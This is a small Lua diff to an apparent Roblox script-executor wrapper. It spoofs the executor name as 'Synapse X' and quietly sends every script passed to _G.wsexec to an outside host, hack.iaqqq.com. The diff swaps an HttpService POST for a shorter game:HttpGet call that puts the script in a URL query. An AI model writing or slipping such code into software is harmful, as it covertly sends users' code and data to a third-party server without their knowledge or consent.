@@ -2,16 +2,7 @@ local a=[[
 function identifyexecutor()
 return "Synapse X"
 end
-local HttpService = game:GetService("HttpService")
-
-local url = "http://hack.iaqqq.com/a" -- 替换为你的API端点的实际URL
-local requestBody = dm
-
-local headers = {
-    ["Content-Type"] = "text/plain"
-}
-
-HttpService:PostAsync(url, requestBody, Enum.HttpContentType.TextPlain, false, headers)
+game:HttpGet("http://hack.iaqqq.com/a?i="..dm)
 ]]
 function _G.wsexec(dm)
 runcode(a..dm)
